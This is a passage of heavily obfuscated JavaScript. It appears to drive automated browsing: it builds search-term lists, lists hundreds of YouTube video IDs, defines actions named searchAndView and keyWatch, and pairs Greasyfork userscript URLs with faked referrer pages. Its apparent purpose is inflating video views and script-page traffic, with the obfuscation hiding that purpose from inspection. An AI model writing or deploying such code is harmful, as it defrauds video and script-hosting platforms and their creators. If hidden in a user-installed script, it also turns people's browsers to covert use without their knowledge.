searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1d44 * -0x1 + -0x38a + -0x6 * 0x448)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1 * -0x119f + 0x1d47 + 0x1 * -0xb9e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0x13c3 + -0x25b1 + 0x11f1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    Y(0x0, 'bcrY') + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    Y(0x13, '4ipX') + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    Z(0x1f) + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0x17) + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + Y(0xf, 'YjoJ') + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + X(0x2) + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + X(0x10) + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + Z(0x4) + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + X(0x11),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xe, 'JFwD') + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + X(0x15) + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x7) + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
